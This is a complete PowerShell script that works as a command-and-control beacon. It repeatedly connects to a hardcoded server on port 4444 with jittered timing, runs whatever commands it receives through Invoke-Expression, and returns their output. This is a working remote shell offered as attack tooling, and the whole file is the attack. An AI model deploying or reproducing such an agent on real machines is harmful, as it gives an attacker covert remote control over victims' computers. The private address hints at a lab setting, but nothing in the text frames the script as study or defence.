# Parameters
$ServerIP = "192.168.108.15"
$ServerPort = 4444
$Delay = 10
$Jitter = 2

# Function to generate random sleep interval
function Get-RandomSleepTime {
    param (
        [int]$BaseDelay,
        [int]$Jitter
    )
    $lower = $BaseDelay - $Jitter
    $upper = $BaseDelay + $Jitter
    return Get-Random -Minimum $lower -Maximum ($upper + 1)
}

# Infinite loop to beacon to the agent server
while ($true) {
    try {
        # Establish TCP connection
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($ServerIP, $ServerPort)
        $stream = $tcpClient.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        Write-Host "[$(Get-Date)] Checking in..."

        # Inner loop to read and execute commands from the server
        while ($tcpClient.Connected -and $stream.DataAvailable) {
            # Read command from the server if available
            $command = $reader.ReadLine()
            if ($command) {
                Write-Host "Received command: $command"
                
                # Execute the command and capture output
                try {
                    $output = Invoke-Expression $command 2>&1 | Out-String
                } catch {
                    $output = "Error executing command: $_"
                }
                
                # Ensure output is in string format, handling arrays properly
                $formattedOutput = ($output -join "`n").Trim()
                
                # Send output back to server
                $writer.WriteLine($formattedOutput)
                $writer.WriteLine("ac2delim")
            }
            Start-Sleep -Milliseconds 500 # Short pause between command checks
        }

        # Close connection after processing commands
        $reader.Close()
        $writer.Close()
        $tcpClient.Close()
    }
    catch {
        Write-Host "Failed to connect or connection lost. Retrying after delay..."
    }

    # Calculate randomized sleep time and wait before next connection attempt
    $sleepTime = Get-RandomSleepTime -BaseDelay $Delay -Jitter $Jitter
    Start-Sleep -Seconds $sleepTime
}
